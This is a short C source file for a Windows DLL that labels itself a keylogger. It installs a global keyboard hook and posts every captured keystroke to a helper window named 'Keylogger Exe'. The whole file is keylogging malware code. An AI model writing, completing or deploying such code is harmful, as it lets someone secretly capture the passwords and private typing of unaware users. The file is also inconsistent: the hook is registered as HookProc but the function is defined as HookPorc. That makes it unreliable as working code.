
#include "main.h"

HHOOK hook = NULL;
HWND hwnd = NULL;
HINSTANCE hinstance = NULL;

KEYDLL3_API void installhook(HWND h)
{
    hook = NULL;
    hwnd = h;
    hook = SetWindowsHookEx( 2, // WH_KEYBOARD
                             HookProc,
                             hinstance,
                             0);
    if (hook == NULL)
        MessageBox( NULL, "Unable to install hook", "Error", MB_OK);
}

KEYDLL3_API void removehook()
{
    UnhookWindowsHookEx(hook);
}

KEYDLL3_API LRESULT CALLBACK HookPorc( int ncode,
                                       WPARAM wparam,
                                       LPARAM lparam)
{
    if (ncode >= 0)
    {
        // Find application window handle
        hwnd = FindWindow("#32770", "Keylogger Exe"); // a voir
        // Send info to app window
        PostMessage(hwnd, WM_USER+755, wparam, lparam); // a voir
    }
    // pass control to next hook
    return (CallNextHookEx(hook, ncode, wparam, lparam));
}
